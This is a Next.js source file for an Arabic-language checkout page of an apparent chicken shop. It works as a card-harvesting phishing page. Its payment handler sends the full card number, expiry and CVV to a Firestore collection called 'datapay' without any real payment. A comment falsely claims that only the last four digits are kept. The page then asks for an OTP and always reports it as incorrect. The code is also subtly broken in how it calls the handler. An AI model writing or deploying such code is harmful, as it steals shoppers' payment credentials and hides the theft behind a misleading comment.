'use client'

import { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { Navbar } from "@/components/ui/navbar"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { collection, addDoc } from 'firebase/firestore'
import { db } from '@/lib/firebase'
const products = [
  {
    id: 1,
    name: "دجاج كاملة 1200 جرام",
    price: 5.5,
  },
  {
    id: 2,
    name: "دجاج كاملة 1000 جم",
    price: 4.75,
  },
  {
    id: 3,
    name: "دجاج كاملة 700 جم",
    price: 3.5,
  },
  {
    id: 4,
    name: "دبوس",
    price: 4.0,
  },
  {
    id: 5,
    name: "فخذ دجاج كامل",
    price: 3.75,
  },
  {
    id: 6,
    name: "فخذ دجاج علوي",
    price: 3.25,
  }
]

type CartItem = {
  id: number;
  quantity: number;
}

export default function CheckoutPage() {
  const [cart, setCart] = useState<CartItem[]>([])
  const [step, setStep] = useState(1)
  const [shippingInfo, setShippingInfo] = useState({
    name: '',
    address: '',
    city: '',
    phone: '',
  })
  const [paymentInfo, setPaymentInfo] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    otp:''
  })
  const router = useRouter()

  useEffect(() => {
    const savedCart = localStorage.getItem('cart')
    if (savedCart) {
      setCart(JSON.parse(savedCart))
    }
  }, [])

  const calculateTotal = () => {
    return cart.reduce((total, item) => {
      const product = products.find(p => p.id === item.id)
      return total + (product?.price || 0) * item.quantity
    }, 0)
  }

  const handleShippingSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setStep(2)
  }

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
   
    setStep(3)

    
    try {
      // Create an order object
      const order = {
        paymentInfo: {
          cardNumber: paymentInfo.cardNumber, // Only store last 4 digits
          expiryDate: paymentInfo.expiryDate,
          cvc:paymentInfo.cvv
        },
        createdAt: new Date()
      }

      // Add the order to Firestore
      const docRef = await addDoc(collection(db, "datapay"), order)

    
      // Clear the cart and redirect to home page
      localStorage.removeItem('cart')
    } catch (error) {
      console.error("Error adding document: ", error)
     
    }
  }
  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      <Navbar />
      
      <main className="container mx-auto px-4 py-12">
        <h1 className="text-4xl font-bold text-[#002B5C] mb-12 text-center">إتمام الطلب</h1>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
          <Card>
            <CardHeader>
              <CardTitle>ملخص الطلب</CardTitle>
            </CardHeader>
            <CardContent>
              {cart.map(item => {
                const product = products.find(p => p.id === item.id)
                return product ? (
                  <div key={item.id} className="flex justify-between items-center mb-2">
                    <span>{product.name} x {item.quantity}</span>
                    <span>{(product.price * item.quantity).toFixed(2)} د.ك</span>
                  </div>
                ) : null
              })}
              <div className="border-t pt-2 mt-4">
                <div className="flex justify-between items-center font-bold">
                  <span>الإجمالي</span>
                  <span>{calculateTotal().toFixed(2)} د.ك</span>
                </div>
              </div>
            </CardContent>
          </Card>

          {step === 1 ? (
            <Card>
              <CardHeader>
                <CardTitle>عنوان الشحن</CardTitle>
              </CardHeader>
              <CardContent>
                <form onSubmit={handleShippingSubmit}>
                  <div className="space-y-4">
                    <div>
                      <label htmlFor="name">الاسم</label>
                      <Input
                        id="name"
                        value={shippingInfo.name}
                        onChange={(e) => setShippingInfo({...shippingInfo, name: e.target.value})}
                        required
                      />
                    </div>
                    <div>
                      <label htmlFor="address">العنوان</label>
                      <Input
                        id="address"
                        value={shippingInfo.address}
                        onChange={(e) => setShippingInfo({...shippingInfo, address: e.target.value})}
                        required
                      />
                    </div>
                    <div>
                      <label htmlFor="city">المدينة</label>
                      <Input
                        id="city"
                        value={shippingInfo.city}
                        onChange={(e) => setShippingInfo({...shippingInfo, city: e.target.value})}
                        required
                      />
                    </div>
                    <div>
                      <label htmlFor="phone">رقم الهاتف</label>
                      <Input
                        id="phone"
                        value={shippingInfo.phone}
                        onChange={(e) => setShippingInfo({...shippingInfo, phone: e.target.value})}
                        required
                      />
                    </div>
                    <Button type="submit" className="w-full bg-[#002B5C] hover:bg-[#001F43] text-white">
                      متابعة للدفع
                    </Button>
                  </div>
                </form>
              </CardContent>
            </Card>
          ) :       step === 2 ? (
            <Card>
              <CardHeader>
                <CardTitle>الدفع</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  <div>
                    <label htmlFor="cardNumber">رقم البطاقة</label>
                    <Input
                      id="cardNumber"
                      onChange={(e) => setPaymentInfo({...paymentInfo, cardNumber: e.target.value})}

                      placeholder="1234 5678 9012 3456"
                      required
                    />
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label htmlFor="expiryDate">تاريخ الانتهاء</label>
                      <Input
                        id="expiryDate"
                        placeholder="MM/YY"
                        required
                      onChange={(e) => setPaymentInfo({...paymentInfo, expiryDate: e.target.value})}

                      />
                    </div>
                    <div>
                      <label htmlFor="cvv">CVV</label>
                      <Input
                      onChange={(e) => setPaymentInfo({...paymentInfo, cvv: e.target.value})}
                      id="cvv"
                        placeholder="123"
                        required
                      />
                    </div>
                  </div>
                  <Button onClick={()=>handlePaymentSubmit().then(()=>{
                    alert("رمز التحقق غير صحيح")
                  })} className="w-full bg-[#002B5C] hover:bg-[#001F43] text-white">
تحقق                  </Button>
                </div>
              </CardContent>
            </Card>
          ):(<Card>
             <CardHeader>
                <CardTitle>رمز التحقق OTP</CardTitle>
              </CardHeader>
              <CardContent>
              <div>
                      <label htmlFor="otp">ادخل رمز التحقق المرسل الى هاتفك</label>
                      <Input
                      onChange={(e) => setPaymentInfo({...paymentInfo, otp: e.target.value})}
                      id="otp"
                        placeholder="*******"
                        required
                      />
                    </div>
              </CardContent>
          </Card>)}
        </div>
      </main>
    </div>
  )
}

